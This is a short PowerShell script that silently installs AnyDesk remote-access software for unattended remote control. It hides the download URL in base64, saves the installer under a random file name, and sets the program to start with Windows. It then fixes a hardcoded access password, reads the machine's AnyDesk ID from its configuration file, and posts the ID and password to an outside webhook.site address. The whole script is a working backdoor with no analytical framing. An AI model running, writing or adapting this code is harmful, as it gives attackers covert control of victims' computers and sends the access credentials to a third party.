$u=([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly9kb3dubG9hZC5hbnlkZXNrLmNvbS9BbnlEZXNrLmV4ZQ==")));
$o="$env:PUBLIC\"+(-join ([char[]](65..90+97..122)|Get-Random -Count 8))+".exe";
Invoke-WebRequest -Uri $u -OutFile $o;Start-Process -FilePath $o -ArgumentList "--install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent";
Start-Sleep -Seconds 5;cmd /c "echo Aa123456! | "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" --set-password";


$cf="C:\ProgramData\AnyDesk\system.conf"; if(Test-Path $cf){$l=Get-Content $cf|Where-Object{$_ -like "ad.anynet.id=*"};if($l){$i=$l -replace "ad.anynet.id=",""}else{$i="unknown"};$msg="AnyDesk ID is: $i AND Password is: Aa123456!";$wu="https://webhook.site/ea714bfe-49fa-4482-af6c-6bbddc75ec15";Invoke-WebRequest -Uri $wu -Method Post -Body $msg}
